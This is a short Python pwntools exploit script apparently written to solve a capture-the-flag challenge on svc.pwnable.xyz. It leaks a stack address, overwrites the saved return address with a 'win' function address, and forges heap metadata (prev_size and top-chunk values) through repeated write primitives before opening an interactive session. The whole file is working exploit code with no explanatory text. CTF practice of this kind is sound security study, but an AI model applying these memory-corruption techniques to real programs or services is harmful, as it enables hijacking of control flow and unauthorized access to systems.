#!/usr/bin/python3

from pwn import *
context.binary = exe = ELF('./challenge',checksec=False)
#p = process(exe.path,aslr=False)
#gdb.attach(p,gdbscript='''
 #       b*0x000000000040085b
#        b*0x0000000000400870
#        b*0x0000000000400889
#        b*0x00000000004008bd
#           ''')
p = remote('svc.pwnable.xyz', 30005)

win = 0x400a3e
bss = 0x601030

# Step 1. leak stack address [sp+0x10] : ptr
p.sendlineafter('> ', '2')

stack = int(p.recv(14), 16)

ret = stack + 0x58

def payload(buf):
    p.sendlineafter(b'> ',b'1')
    p.send(buf)
    p.sendlineafter(b'> ',b'3')
input()


payload(b'a'*8 + p64(ret))

### ret_address ###
payload(p64(win) + p64(0x601018))


#### prev_size ###
payload(p64(0x21) + p64(0x601038))

#### top chunk ###
payload(p64(0x20d91) + p64(0x601020))

payload(p64(0) + p64(0x601020))

p.sendlineafter(b'> ',b'0')
p.interactive()
